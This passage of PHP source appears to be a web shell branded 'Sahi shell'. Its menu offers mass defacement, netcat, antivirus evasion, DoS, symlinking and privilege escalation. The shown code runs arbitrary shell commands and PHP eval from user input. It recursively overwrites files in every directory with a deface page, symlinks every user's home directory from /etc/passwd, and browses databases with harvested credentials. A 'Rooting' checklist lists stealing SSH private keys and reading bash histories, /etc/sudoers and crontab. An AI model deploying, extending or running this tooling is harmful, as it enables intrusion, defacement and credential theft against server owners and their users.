				var fileInput = document.createElement("input");
				var fileAttrib = document.createAttribute("type");
				fileAttrib.value = "file";
				var onchangeAttrib = document.createAttribute("onchange");
				onchangeAttrib.value = "fileSelected();";
				var nameAttrib = document.createAttribute("name");
				nameAttrib.value = "uploadFile[]";
				
				fileInput.setAttributeNode(fileAttrib);
				fileInput.setAttributeNode(onchangeAttrib);
				fileInput.setAttributeNode(nameAttrib);  
				 
				//create new div 
				var divSelectFile = document.createElement("div");
				var divClassAttrib = document.createAttribute("class");
				divClassAttrib.value = "selectFile";
				divSelectFile.setAttributeNode(divClassAttrib);
				
				/// append text and file input to dive
				divSelectFile.appendChild(br);
				divSelectFile.appendChild(textnode);
				divSelectFile.appendChild(fileInput);
				//y.appendChild(divSelectFile);
				// append div to file container
				y.appendChild(divSelectFile);
				
				
			}
		</script>
	
		<?php 
}
function includeBanner()
{
	global $rpath;
	echo "<div id=\"bannerDiv\">";
	echo "<div id='logo'><a href='{$rpath}?home=1'><span id='logo'>Sahi</span>
	<span id='logo1'>shell</span></a></div>";
	banner();
	echo "</div>";
}	
function includeMenuBar()
{
	global $rpath;
	?>
	<div id="menu">
	<a class="menu" href="<?php echo $rpath?>?home=1">Home</a>  
	<a class="menu" href="<?php echo $rpath?>?cv=1">FileManager</a> 
	<a class="menu" href="<?php echo $rpath?>?cv=2">Upload</a> 
	<a class="menu" href="<?php echo $rpath?>?cv=3">CMD</a> 
	<a class="menu" href="<?php echo $rpath?>?cv=4">Database</a> 
	<a class="menu" href="<?php echo $rpath?>?cv=5">MassDeface</a> 
	<a class="menu" href="<?php echo $rpath?>?cv=6">Symlink</a> 
	
	<a class="menu" href="<?php echo $rpath?>?cv=7">Process</a> 
	<a class="menu" href="<?php echo $rpath?>?cv=8">Eval</a> 
	<a class="menu" href="<?php echo $rpath?>?cv=9">Find</a> 
	<a class="menu" href="<?php echo $rpath?>?cv=13">Config</a> 
	<a class="menu" href="<?php echo $rpath?>?cv=14">Mailer</a> 
	<a class="menu" href="<?php echo $rpath?>?cv=15">Domains</a> 
	<a class="menu" href="<?php echo $rpath?>?cv=16">Headers</a> 
	<a class="menu" href="<?php echo $rpath?>?cv=17">Netcat</a> 
	<a class="menu" href="<?php echo $rpath?>?cv=18">Commands</a> 
	<a class="menu" href="<?php echo $rpath?>?cv=20">SecInfo</a>  
	<a class="menu" href="<?php echo $rpath?>?cv=21">Hash</a> 
	<a class="menu" href="<?php echo $rpath?>?cv=22">Zone-H</a> 
	<a class="menu" href="<?php echo $rpath?>?cv=23">Exploit</a> 
	<a class="menu" href="<?php echo $rpath?>?cv=24">CodeInject</a>
	<a class="menu" href="<?php echo $rpath?>?cv=25">Bypasser</a>
	<a class="menu" href="<?php echo $rpath?>?cv=26">DoS</a>
	<a class="menu" href="<?php echo $rpath?>?cv=28">SelfRemove</a>
	<a class="menu" href="<?php echo $rpath?>?cv=29">Forums</a>

	<a class="menu" href="<?php echo $rpath?>?cv=34">EvadeAV</a>
	<a class="menu" href="<?php echo $rpath?>?cv=37">PortScanner</a>
	<a class="menu" href="<?php echo $rpath?>?cv=10">Rooting</a>
	<a class="menu" href="<?php echo $rpath?>?cv=11">Logout</a>
	<a class="menu" href="<?php echo $rpath?>?cv=chp">ChangePassword</a>
	
	</div>
	<?php 
}
	//echo $url;
function displayFileManager()
{

		$dir = dirList($_SESSION['current_dir']);
		displayDirList($dir);
	
	
}
function dirList($arg) {
	$total = 0;

	if(isset($_SESSION['current_dir']))
		chdir($_SESSION['current_dir']);
	if (file_exists($arg)) {
		if (is_dir($arg)) {
			$handle = opendir($arg);
			while($aux = readdir($handle)) {

				if(!is_dir($aux))

					$dir[]=array("fname"=>$aux ,"fsize"=> (get_size($aux)),"perms"=>show_perms(fileperms($aux)), "mdate"=>date('d-M-Y h:i:s', filemtime($aux)));
				else
					$dir[]=array("fname"=>"[ {$aux} ]","fsize"=> "Dir","perms"=>show_perms(fileperms($aux)), "mdate"=>date('d-M-Y h:i:s', filemtime($aux)));

				//}
			}
			@closedir($handle);
		}
		else
			$total = filesize($arg);
	}
	asort($dir);
	return $dir;
}
function displayDirList( $dir)
{
	global $rpath, $islinux;
	echo "<div class='bodyDiv' >
		<form  method='post' name='fmform' id='fmform1'>";
	echo "<table><tr><th> </th><th>Filename</th><th>Size</th>";
	if($islinux)
	{
		echo "<th>Owner:Group</th>";
	}
	echo "<th>Perms</th><th>Modified</th><th>Action</th></tr>";
		
	foreach ($dir as $d)
	{
		if($d['fname'][0]==='[')
		{
			
			$tname = str_replace("[ ","",$d['fname']);
			$tname = str_replace(" ]","",$tname);
			echo "\n<tr>";
			echo "<td class=\"center\"><input type=\"checkbox\" 
			name='fileItem[]' value='{$tname}'></td>";
			echo "<td><a href='{$rpath}?cd={$tname}'>{$d["fname"]}</a></td>";
			echo "<td class=\"center\">".$d["fsize"] . "</td>";
			if($islinux)
			{
				$o = posix_getpwuid(fileowner($tname));
				$g = posix_getgrgid(filegroup($tname));
				echo "<td class=\"center\">". $o['name'] . 
				":" . $g['name'].
				"</td>";
			}
			echo "<td class=\"center\">".$d["perms"] . "</td>";
			echo "<td class=\"center\">".$d["mdate"] . "</td>";
			echo "<td class=\"center\">"; 
			echo "<a href=\"javascript:;\"
			 onclick=\"displayPopupNewName('NewName','".$tname."')\">Rename</a>";
			echo "<a href=\"{$rpath}?delf={$tname}\">Delete</a><a href=\"{$rpath}?dl={$tname}&dlf=1\">Download</a></td>";
			echo "</tr>";
		}
		
	}
	foreach ($dir as $d)
	{
		if($d['fname'][0]!=='[')
		{
			
			echo "\n<tr>";
			echo "<td class=\"center\"><input type=\"checkbox\"
		name='fileItem[]' value='{$d['fname']}'></td>";
			//if(is_dir($d['fname']))
			//{
				//echo "<td><a href='#'>{$d["fname"]}</a></td>";
			//}
			//else {
				//echo "<td><a href='#'>{$d["fname"]}</a></td>";
				
		//	}
			echo "<td><a href='{$rpath}?dl={$d['fname']}'>{$d["fname"]}</a></td>";
			echo "<td class=\"center\">".$d["fsize"] . "</td>";
			if($islinux)
			{
				//echo "<td class=\"center\">";//. posix_getpwuid(fileowner($d['fname']))['name'] .
				//":" . posix_getgrgid(filegroup($d['fname']))['name'].
				// echo "</td>";
				 $o = posix_getpwuid(fileowner($d['fname']));
				 $g = posix_getgrgid(filegroup($d['fname']));
				 echo "<td class=\"center\">". $o['name'] .
				 ":" . $g['name'].
				 "</td>";
			}
			echo "<td class=\"center\">".$d["perms"] . "</td>";
			echo "<td class=\"center\">".$d["mdate"] . "</td>";
			echo "<td class=\"center\"><a href=\"{$rpath}?vf={$d['fname']}\">View</a>";
			echo "<a href=\"javascript:;\" 
			 onclick=\"displayPopupNewName('NewName','".$d['fname']."')\">Rename</a>";
			 
			echo "<a href=\"{$rpath}?delf={$d['fname']}\">Delete</a><a href=\"{$rpath}?dl={$d['fname']}\">Download</a> </td>";
			echo "</tr>";
		}
	}
	echo "</table><br>";
	echo "Actions: ";
	echo "<input type='submit' name='dff' value='NewFolder' 
		onclick='displayNewFolder();return false;'>";
	echo "<input type='submit' name='dff' value='NewFile' 
			onclick=\"displayNewFile('NewFile');return false;\">";
//		onclick=\"displayNewFile('NewFile');return false;\">";
	echo "<input type='submit' name='dff' value='Copy' > ";
	echo "<input type='submit' name='dff' value='Cut'>";
	echo "<input type='submit' name='dff' value='Paste'>";
	echo "<input type='submit' name='dff' value='Delete'>";
	echo "<input type='submit' name='dff' value='Zip'>";
	echo "<input type='submit' name='dff' value='Zip Download'>";
		
	
	echo "</form></div>";
}
function displayUpload()
{
	global $rpath;
	?>
	<div id='upload'>
	<form action="<?php echo $rpath?>?upl=1" method="POST" enctype="multipart/form-data">
	<div id="fileContainer">
		<div class="selectFile">				
		Select File!
		<input type="file" onchange="fileSelected();" name="uploadFile[]">
		
		</div>
	</div>
	<input type="submit" value="upload">
	</form></div>
	<?php 
}
function displayCMD()
{
	if(isset($_SESSION['current_dir']))
		chdir($_SESSION['current_dir']);
	echo "<div id='textAreaDiv'><textarea name=\"test\" id=\"tarea\" rows=\"15\" readonly>".getcwd()."\n</textarea></div>";
	?>
		<div id='cmdDiv'><form method="post" onsubmit="return false;">
		<label onmouseover="selectCMD();"  >cmd: <input type="text" size=40% name="cmd" autocomplete="off" id="cmd" onmouseover="this.select();"></label>
		<input type="submit" name="Execute" value="Execute"   onclick="executeCMD();">
		<input type="submit" name="Clear" value="Clear History"   onclick="clearHistory();">
		</form></div>
		<?php 
		
}	
function displayMassDeface()
{
	global $rpath;
		?>
		<form method="post" action="<?php echo $rpath?>?md=1">
		<div id='textAreaDiv'><textarea name="defacePage" id="tarea" rows="15" >Deface Page Here!</textarea></div>
		<div class='bodyDiv'>
		<label >
		Filename: <input type="text" size=30% name="defaceFilename" autocomplete="off"  onmouseover="this.select();"/>
		</label>
		<label >
		Path: <input type="text" value="<?= $_SESSION['current_dir']?>" size=30% name="defacePath" autocomplete="off"  onmouseover="this.select();"/>
		</label>
		<input type="submit" name="Execute" value="Deface"   onclick="executeCMD();">
		
		</div></form>
		<?php 
}
function saveFile()
{
	$fileCount = count($_FILES['uploadFile']['name']);
	for($i=0;$i<$fileCount-1;$i++)
	{
		$fname= $_FILES['uploadFile']['name'][$i];
		$tname= $_FILES['uploadFile']['tmp_name'][$i];
		$cdir = $_SESSION['current_dir'];
		save_upload($tname, $fname,$cdir );
	}
}
function getAvailableFilename($path,$filename)
{
	//chdir($path);
	$i=0;
	while(true)
	{
		if(file_exists($filename.".bkp." . $i))
		{
			$i++;
		}
		else 
			return $filename.".bkp." . $i;
	}
}
function massDeface($defacePath)
{
	global $defacePage, $defaceFilename;
	global $rnd;
	chdir($defacePath);
	if(file_exists($defaceFilename))
	{
		rename($defaceFilename,getAvailableFilename($defacePath, $defaceFilename));
	}
	$myfile = fopen($defaceFilename, "w") or die("Unable to open file!");
	fwrite($myfile, $defacePage);
	fclose($myfile);
	

	$handle = opendir($defacePath);
	while($aux = readdir($handle)) {
		//if ($aux != "." && $aux != "..")
		//{
		//$total += total_size($arg."/".$aux);
		if(is_dir($aux) && $aux != "." && $aux != "..")
		{
			massDeface(getcwd()."\\" . $aux);
			chdir($defacePath);
		}
			
		//}
	}
	@closedir($handle);
		
}
function displayProcess()
{
	global $islinux;
	
	//echo "<div class=\"bodyDiv\">";
	if(!$islinux)
	{
		echo "<form method='post'><table><tr><th> </th><th>Process</th><th>PID</th><th>Sess Name</th><th>Sess#</th><th>Mem Usage</th></tr>";
	
	
		exec("tasklist 2>NUL", $task_list);
		for ($i=3;$i<count($task_list);$i++){
			$task_line = $task_list[$i];
			//explode(" ",);
			list($pname,$pid,$sname,$snumber,$memusage,$unit)=preg_split("/[ ]+/",$task_line);
			echo "<tr>";
			echo "<td class=\"center\"><input type=\"checkbox\"
		name='killPid[]' value={$pid}></td>";
			echo "<td class=\"center\">{$pname}</td>";
			echo "<td class=\"center\">{$pid}</td>";
			echo "<td class=\"center\">{$sname}</td>";
			echo "<td class=\"center\">{$snumber}</td>";
			echo "<td class=\"center\">{$memusage} {$unit}</td>";
			echo "</tr>";
	//		echo $task_line . "<br/>";

		}
		echo "</table><br><input type='submit' name='killPids' value='Kill'></form>";
	}
	else 
	{
		echo "<form method='post'><table id='processes'> <tr><th> </th><th>USER</th><th>PID</th><th>%CPU</th>
		<th>%MEM</th><th>VSZ</th><th>RSS</th><th>TTY</th><th>STAT</th><th>START</th><th>TIME</th><th style='text-align:left'>COMMAND</th></tr>";
		exec("ps aux ", $task_list);
		for ($i=3;$i<count($task_list);$i++){
			$task_line = $task_list[$i];
			//explode(" ",);
			list($user,$pid,$cpu,$mem,$vsz,$rss,$tty,$stat,$start,$time,$command)=preg_split("/[ ]+/",$task_line);
			preg_match("/(^.*?[ ]+.*?[ ]+.*?[ ]+.*?[ ]+.*?[ ]+.*?[ ]+.*?[ ]+.*?[ ]+.*?[ ]+.*?[ ]+.*?)(.*)/", $task_line, $matches);
			$command1 = $matches[2];
			echo "<tr>";
			echo "<td class=\"center\"><input type=\"checkbox\"
		name='killPid[]' value={$pid}></td>";
			echo "<td class=\"center\">{$user}</td>";
			echo "<td class=\"center\">{$pid}</td>";
			echo "<td class=\"center\">{$cpu}</td>";
			echo "<td class=\"center\">{$mem}</td>";
			echo "<td class=\"center\">{$vsz}</td>";
			echo "<td class=\"center\">{$rss}</td>";
			echo "<td class=\"center\">{$tty}</td>";
			echo "<td class=\"center\">{$stat}</td>";
			echo "<td class=\"center\">{$start}</td>";
			echo "<td class=\"center\">{$time}</td>";
			echo "<td >{$command1}</td>";
			echo "</tr>";
		}
		echo "</table><br><input type='submit' name='killPids' value='Kill'></form>";
	}
	//echo "</div>";
}
function killProcesses($pids)
{
	global $islinux;
	foreach ($pids as $pid)
	{
		if(!$islinux)
		{
			exec("taskkill /F /PID $pid");
		}
		else
		{
			exec("kill -9 {$pid}");
		}
			
	}
	
}
function displayFind()
{
	chdir($_SESSION['current_dir']);
	?>
	<div class='bodydiv'>
	<form method='post'>
	<table id='find'>
	<tr>
	<td>Search in:</td><td> <input name='searchIn' value="<?php echo getcwd();?>">
	</td></tr>
	<tr>
	<td>Dirname contains:</td><td> <input name='dirnamecontain'>
	</td></tr>
	<tr>
	<td>Filename contains: </td><td><input name='filenamecontain'>
	</td></tr>
	<tr>
	<td>File Contain: </td><td><input name='filecontain'>
	</td></tr>
	<tr>
	<td>Permissions: </td><td><input type="checkbox" name='readable'> Readable 
	<input type="checkbox" name='writable'> Writable 
	<input type="checkbox" name='executable'> Executable 
	</td></tr>
	<tr>
	<td><input type='submit' name='Find' value='Find'>
	</td><td></td></tr>
	</table>
	</form>
	</div>
	<?php 
}
function processFind()
{
	global $searchIn,$dirnamecontain,$filenamecontain, 
	$readable,$writable,$executable;
	
	echo "<div class='bodyDiv'>";

	findNameContain($searchIn,$dirnamecontain,$filenamecontain);
	echo "</div>";
	
}
function findNameContain($searchIn, $dirnamecontain,$filenamecontain)
{
	global $rpath,$filecontain,$readable,$writable,$executable;
	chdir($searchIn);

		
	// Create recursive directory iterator
	/** @var SplFileInfo[] $files */
	$files = new RecursiveIteratorIterator(
			new RecursiveDirectoryIterator( $searchIn),
			RecursiveIteratorIterator::LEAVES_ONLY
	);
	
	foreach ($files as $name => $file)
	{
		// Skip directories (they would be added automatically)
		$filePath = $file->getRealPath();
		if (!$file->isDir() and $filenamecontain!==""
				and	strpos($name,$filenamecontain)!==false)
		{
			// Get real and relative path for current file
			
			echo "<a href='{$rpath}?dl={$filePath}&dlfile=1'>".$filePath . "</a><br>";
	
		}
		if (!$file->isDir() and $filecontain!=="")
		{
			// Get real and relative path for current file
			if(findFileContent($filePath,$filecontain))
			{	
				echo "<a href='{$rpath}?dl={$filePath}&dlfile=1'>".$filePath . "</a><br>";
			}
		}
		else if($file->isDir() and strpos($file,'..')===false
				and $dirnamecontain!=="" and 
				strpos($name,$dirnamecontain)!==false)
		{
			
				echo "<a href='{$rpath}?cd={$filePath}&cdf=1'>".$filePath. "</a><br>";
			
		}
		$p1 = fileperms($filePath);
		$perms = show_perms($p1);
		
		if ( ( isset($readable) and strpos($perms,'r')!=false) or 
			(isset($writable) and strpos($perms,'w') !=false) or 
			(isset($executable) and strpos($perms,'x')!=false) )
				
		{
			// Get real and relative path for current file
			if(!$file->isDir() and strpos($file,'..')===false)
			{
				echo "<a href='{$rpath}?dl={$filePath}&dlfile=1'>".$filePath . "</a><br>";
			}
			else if(strpos($file,'..')===false)
			{
				echo "<a href='{$rpath}?cd={$filePath}&cdf=1'>".$filePath. "</a><br>";
			}
		}
		
	}
	
}
function findFileContent($file,$pattern)
{
	$data = file_get_contents($file);
	//if(strpos($data))
	//var_dump($data);
	if(strpos($data,$pattern)!==false)
	{
		return true;
	}
	return false;
}
function phpEval()
{
	global $ev;
	//eval(stripslashes($ev));
	eval($ev);
}
function displayEval()
{
	global $rpath;
	?>
		<form method="post" onsubmit="return false;">
		<div id='textAreaDiv'>
		<textarea name="code" id="tarea" rows="15" >echo "Welcome!";</textarea>
		</div>
		<input type="submit" style="margin-left: 10px" name="Execute" value="Execute"   onclick="executeEval();">
		</form>
		
		<div class='bodyDiv' id='evalBody'>
		
		Welcome!
		</div>
		<?php 
}
function displayRooting()
{
	global $rpath;
	?>
		
		
		<div class='bodyDiv' >
		
		1 - Search rooting exploit to escalate privileges.<br>
		2 - Symlink webserver.<br>
		3 - Find database connection files using: find ./ -name *.php -print0 | xargs -0 grep -i -n "mysql_connect"
		4 - Find database user with admin privileges.<br>
		5 - Search for username and password in webserver logs<br>
		6 - Search Bash history for passwords, e.g. cat /home/UserName/.bash_history , cat /root/.bash_history
		 <br>
		7 - Find apache .htpasswd and Crack passwords with Hashcat.<br>
		8 - Read emails on Server. <br>
		9 - Exploit cat /etc/crontab <br>
		10 - Get files edited with vi editor by appending ~ to file name <br>
		11- Crack all passwords for web application users, one of them will have sudo su priviliges.<br>
		12- cat /etc/sudoers<br>
		13- Trash files# cat /home/UserName/.local/share/Trash/files/Payroll<br>
		14- Steal ssh private keys <br>
		 
		<br/><br/><br/><br/><br/><br/>
		</div>
		<?php 
}
function displaySymlink()
{
	
	global $rpath, $islinux;
	if($islinux)
	{
		$lines = file("/etc/passwd");
				
		chdir($_SESSION['current_dir']);
		mkdir("stshell");
		chdir("stshell");	
		$tmp=getcwd();	
		echo "<div class='bodyDiv' >";
		echo "<table>";
		foreach($lines as $line)
		{
			list($user,,,,,$home,)=explode(":",$line);
			echo "<tr><td>".$user."</td><td>
			<a href='{$rpath}?cds={$tmp}/{$user}' onclick='return !window.open(this.href);'>".$home."</a></td></tr>";
	
			exec("ln -s ".$home . " ". $user,$output);
			
		}
		
		echo "</div>";
	}	
	else 
	{
		echo "<div class='bodyDiv' >Is this linux machine???</div>";
	}
}
function displayDatabase()
{
	global $rpath,$v,$connect,$disconnect,$query,$rem;
	if(isset($connect))
	{
		list($u,$h)=explode("@",$connect);
		selectDatabase($u, $h);
		//$v='cn';
	}
	if(isset($rem))
	{
		list($u,$h)=explode("@",$rem);
		removeDatabase($u, $h);
		$v='cn';
	}
	if(isset($disconnect))
	{
		//list($u,$h)=explode("@",$connect);
		//selectDatabase($u, $h);
		unset($_SESSION['selected']);
	}
	?>
	
	<div class="bodyDiv">
	<a href='?v=cn'>Connections </a> 
	<a href='?v=db'>Databases</a>
	<a href='?v=qd'>Query</a>
	</div>
	
	<?php 
	if(isset($v) and $v=='cn')
	{
		?>
	<div id='dbContainer0' >
	
	
		  <div class="bodyDiv">
		  <form onsubmit="return false;">
			  <table id="db" >
			  
			 	 <tr><td id="db">Username:</td><td id="db"> <input type="Text" name="dbusername" id="dbusername"></td></tr>
  			 	 <tr><td id="db">Password: </td><td id="db"><input type="Text" name="dbpassword" id="dbpassword"></td></tr>
  			 	 <tr><td id="db">Database:</td><td id="db"><input type="Text" name="dbname" id="dbname"></td></tr>
  			 	 <tr><td id="db">Host: </td><td id="db"><input type="Text" name="dbhost" id="dbhost"></td></tr>
  			 	 <tr><td id="db"> </td><td id="db"><input type="submit" onclick="saveDB()" value="Save" name="submit"></td></tr>
  			 	 
  			 	 </table>
  			 	 </form>
			  </div>
			  <div class="bodyDiv" id='dbConnectionsList'>
			 	 <?= displayDatabaseCredentials();?>
		  </div>
		  <div class='bodyDiv' id='databasesListDiv' style='display: none'>
			databases<br>
					
		  </div>	
		  <div class='bodyDiv' id='tablesListDiv' style='display: none'>
			tables			
		  </div>	
		  
		
		<div class='bodyDiv1' id='tableDataDiv' style='display: none'>
		table Data
		</div>	
	</div>
	<?php 
	}
	else if($v=='db')
	{
		echo "<div class='bodyDiv'>";
		if(isset($_SESSION['selected']))
		{
			listDatabases();
		}
		else
			displayDatabaseCredentials();
	echo "</div>";
	}
	else if($v=='tb')
	{
		echo "<div class='bodyDiv'>";
		if(isset($_SESSION['selected']))
		{
			listDatabases();
		}
		echo "</div>";
		echo "<div class='bodyDiv'>";
		list($u,$h,$db)=explode("@",$connect);
		listTables($u,$h,$db);
		$_SESSION['selectddb']=$connect;
		echo "</div>";
		
	}
	else if($v=='tbld')
	{
		echo "<div class='bodyDiv'>";
		if(isset($_SESSION['selected']))
		{
			listDatabases();
		}
		echo "</div>";
		echo "<div class='bodyDiv'>";
		list($u,$h,$db)=explode("@",$connect);
		listTables($u,$h,$db);
		echo "</div>";
		echo "<div class='bodyDiv'>";
		list($u,$h,$db,$tbl)=explode("@",$connect);
		displayTableData($u,$h,$db,$tbl);
		$_SESSION['selectedtbl']=$connect;
		echo "</div>";
	
	}
	else if($v=='qd') 
	{
		$db="db";
		$tbl="tbl";
		if(isset($_SESSION['selectedtbl']))
			list($u,$h,$db,$tbl)=explode("@",$_SESSION['selectedtbl']);
		?>
		<div class='bodyDiv'>
		<form method="post">
		<textarea rows=4 name='query'>select * from <?php echo "{$db}.{$tbl}"?>;</textarea>
		<input type='submit' value=Execute>
		</form>
		</div>
		<?php 
		if(isset($query))
		{
			executeQuery($query);
		}
	}
}
function executeQuery($query)
{
	//list($u,$h,$db,$tbl)=$_SESSION['selectddb'];
	if(isset($_SESSION['selected']))
		list($u,$h)=explode("@",$_SESSION['selected']);
	foreach ($_SESSION['dbconnections'] as $con)
	{
		if($con['dbusername']===$u and $con['dbhost']===$h){
			try
			{
				$db = new PDO("mysql:host={$con['dbhost']};dbname={$con['dbname']};charset=utf8",$con['dbusername'],$con['dbpassword']);
				/*Other Codes*/
				$db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
				if(!(preg_match("/^select.*/i",$query)===1))
				{
					echo "<div class='bodyDiv'>Modified Rows: " . $db->exec($query) ."</div>";
					break;
				}
				
				$rows = $db->query($query);
				if($rows)
				{
					$count=$rows->rowCount();
				}
				else
					$count=0;
				echo "<div class='bodyDiv'><table>";
				if($count>0)
				{
					$count--;
					$row=$rows->fetch();
					echo "<tr>";
					$i=1;
					foreach ($row as $k=>$v)
					{
						if($i%2===1)
							echo "<th>".$k . "</th>";
						$i++;
					}
					echo "</tr>";
					echo "<tr>";
					$i=1;
					foreach ($row as $k=>$v)
					{
						if($i%2===1)
							echo "<td class='center'>".$v . "</td>";
						$i++;
					}
					echo "</tr>";
				}
				while($count>0)
				{
					$row=$rows->fetch();
					echo "<tr>";
					$i=1;
					foreach ($row as $k=>$v)
					{
						if($i%2===1)
							echo "<td class='center'>".$v . "</td>";
						$i++;
					}
					echo "</tr>";
					$count--;
				}
				echo "</div></table>";
			
			}
			catch(PDOException  $abc )
			{
				echo "Error: ".$abc->getMessage();
			}
		}
		break;
	}
			
}
function displayDatabaseCredentials()
{
	global $rpath;
	$output="";
	if(!isset($_SESSION['dbconnections']))
		return $output;
	echo "<table id='db'>";
	$u="";
	$h="";
	if(isset($_SESSION['selected']))
		list($u,$h)=explode("@",$_SESSION['selected']);
	foreach ($_SESSION['dbconnections'] as $con)
	{
		if($con['dbusername']===$u and $con['dbhost']===$h){
			echo "<tr><td>{$con['dbusername']} @ {$con['dbhost']}</td><td>
			<a href='?v=cn&disconnect={$con['dbusername']}@{$con['dbhost']}'>Disconnect</a>
			<a href='?rem={$con['dbusername']}@{$con['dbhost']}'>Remove</a></td></tr>";
		}	
		else 
			echo "<tr><td>{$con['dbusername']} @ {$con['dbhost']}</td><td>
		<a href='?v=cn&connect={$con['dbusername']}@{$con['dbhost']}'>Connect</a><a href=''>Remove</a></td></tr>";
		//$output.= "<a href='{$rpath}?listDB=1&{$con['dbusername']}&{$con['dbhost']}'> {$con['dbusername']} @ {$con['dbhost']} </a><br>";
		//$output.= "<a  href=\"javascript:alert('{$con['dbusername']}@{$con['dbhost']}');\" onlick='alert(1);'> {$con['dbusername']} @ {$con['dbhost']} </a><br>";
		//$output.= "<a  href='javascript:;' onclick=\"connectDatabase('{$con['dbusername']}@{$con['dbhost']}');\"> {$con['dbusername']} @ {$con['dbhost']} </a><br>";
		
		//javascript:
	}
	return $output;
}
function saveDatabaseCredentials()
{
	global $dbusername, $dbpassword, $dbname, $dbhost;
	if(!isset($_SESSION['dbconnections']))
		$_SESSION['dbconnections']= array();
	
	$dbhost=(isset($dbhost) and $dbhost!=="")?$dbhost:"localhost";
	$_SESSION['dbconnections'][]=array('admin'=>$dbusername,'melody254'=>$dbpassword,
			'dbname'=>$dbname,'dbhost'=>$dbhost);

	
	echo displayDatabaseCredentials();
}
function connectSelectedDb()
{
	global $con;
	global $mysqlHandle;
	list($u,$h)=explode("@",$_SESSION['selected']);
	foreach ($_SESSION['dbconnections'] as $con1)
	{
		if($con1['dbusername']===$u and $con1['dbhost']===$h)
		{
			$con=$con1;
			$mysqlHandle = @mysql_connect( $h.":3306", $u, $con['dbpassword'] );
			break;
		}		
	}
}
function selectDatabase($u,$h){
	$_SESSION['selected']=$u."@".$h;
}
function removeDatabase($u,$h){
	for($i=0;count($_SESSION['dbconnections']);$i++)
	{
		if($_SESSION['dbconnections'][$i]['dbusername']===$u and 
				$_SESSION['dbconnections'][$i]['dbhost']===$h)
		{
			unset($_SESSION['dbconnections'][$i]);
			unset($_SESSION['selected']);
			$_SESSION['dbconnections']=array_values($_SESSION['dbconnections']);
			break;
		}
	}
	
}
function listDatabases()
{ 

	global $mysqlHandle, $PHP_SELF, $con;
	
	connectSelectedDb();

	$pDB = mysql_list_dbs( $mysqlHandle );
	$num = mysql_num_rows( $pDB );
	//$output = "[ {$u} @ {$h} ]<br>";
	$output="";
	for( $i = 0; $i < $num; $i++ ) {
		$dbname = mysql_dbname( $pDB, $i );

		//$output.= $dbname . "<br/>";
		$output.= "<a  href='?v=tb&connect={$con['dbusername']}@{$con['dbhost']}@${dbname}'> {$dbname}</a><br>";
		
	
	}
	echo $output;
//	return $output;	
	//return "this is list of databases ".$u."@" . $h;
}
function listTables($u,$h,$dbname) {
	global $mysqlHandle, $PHP_SELF,$con;
	connectSelectedDb();

	$pTable = mysql_list_tables( $dbname );

	if( $pTable == 0 ) {
		$msg  = mysql_error();
		echo "<h3>Error : $msg</h3><p>\n";
		return;
	}
	$num = mysql_num_rows( $pTable );

	$output="[ {$dbname} ]<br>";
	for( $i = 0; $i < $num; $i++ ) {
		$tablename = mysql_tablename( $pTable, $i );

		//echo $tablename."<br>";
		$output.= "<a  href='?v=tbld&connect={$con['dbusername']}@{$con['dbhost']}@${dbname}@{$tablename}'> {$tablename}</a><br>";
		

	}
	echo $output;

}
function displayTableData($u,$h,$dbname,$tablename)
{
	//global $mysqlHandle, $PHP_SELF,$con;
	
	//echo "this is table data; {$u} {$h} {$dbname} {$tablename}";
	global $action, $mysqlHandle, $PHP_SELF, $errMsg, $page, $rowperpage, $orderby;
	connectSelectedDb();

	if( $tablename != "" )
		echo "<p >[ $dbname &gt; $tablename ]</p>\n";
	else
		echo "<p class=location>$dbname</p>\n";
	$queryStr="";
	$queryStr = stripslashes( $queryStr );
	if( $queryStr == "" ) {
		$queryStr = "SELECT * FROM $tablename";
		//if( $orderby != "" )
		//	$queryStr .= " ORDER BY $orderby";
		//echo "<a href='$PHP_SELF?action=addData&dbname=$dbname&tablename=$tablename'>Add Data</a> | \n";
		//echo "<a href='$PHP_SELF?action=viewSchema&dbname=$dbname&tablename=$tablename'>Schema</a>\n";
	}
	
	$pResult = mysql_db_query( $dbname, $queryStr );
	$fieldt = mysql_fetch_field($pResult);
	$tablename = $fieldt->table;
	$errMsg = mysql_error();
	
	//$GLOBALS[queryStr] = $queryStr;
	
	if( $pResult == false ) {
		echoQueryResult();
		return;
	}
	if( $pResult == 1 ) {
		$errMsg = "Success";
		echoQueryResult();
		return;
	}
	
	echo "<hr>\n";
	
	$row = mysql_num_rows( $pResult );
	$col = mysql_num_fields( $pResult );
	
	if( $row == 0 ) {
		echo "No Data Exist!";
		return;
	}
	
	if( $rowperpage == "" ) $rowperpage = 30;
	if( $page == "" ) $page = 0;
	else $page--;
	mysql_data_seek( $pResult, $page * $rowperpage );
	
	echo "<div><table syle='display:inline;' id='table01' cellspacing=1 cellpadding=2>\n";
	echo "<tr>\n";
	for( $i = 0; $i < $col; $i++ ) {
		$field = mysql_fetch_field( $pResult, $i );
		echo "<th>";
		if($action == "dmlld0RhdGE=")
			echo "<a href='$PHP_SELF?action=dmlld0RhdGE=&dbname=$dbname&tablename=$tablename&orderby=".$field->name."'>".$field->name."</a>\n";
		else
			echo $field->name."\n";
		echo "</th>\n";
	}
	echo "<th colspan=2>Action</th>\n";
	echo "</tr>\n";
	
	for( $i = 0; $i < $rowperpage; $i++ ) {
		$rowArray = mysql_fetch_row( $pResult );
		if( $rowArray == false ) break;
		echo "<tr>\n";
		$key = "";
		for( $j = 0; $j < $col; $j++ ) {
			$data = $rowArray[$j];
	
			$field = mysql_fetch_field( $pResult, $j );
			if( $field->primary_key == 1 )
				$key .= "&" . $field->name . "=" . $data;
	
			if( strlen( $data ) > 30 )
				$data = substr( $data, 0, 30 ) . "...";
			$data = htmlspecialchars( $data );
			echo "<td>\n";
			echo "$data\n";
			echo "</td>\n";
		}
	
		if( $key == "" )
			echo "<td colspan=2>no Key</td>\n";
		else {
			echo "<td><a href='$PHP_SELF?action=editData$key&dbname=$dbname&tablename=$tablename'>Edit</a></td>\n";
			echo "<td><a href='$PHP_SELF?action=deleteData$key&dbname=$dbname&tablename=$tablename' onClick=\"return confirm('Delete Row?')\">Delete</a></td>\n";
		}
		echo "</tr>\n";
	}
	echo "</table></div>\n";	
}
function displayLoginForm()
{
	echo "<html>";
	includeHead();
	echo "<body bgcolor='#bbbbbb'>";
	
	includeBanner();
	includeMenuBar();

	
	?>
	  <div class="bodyDiv">
	  <form method="post">
			  <table id="db" >
			  
			 	 <tr><td id="db">Username:</td><td id="db"> <input type="Text" name="username" id="dbusername"></td></tr>
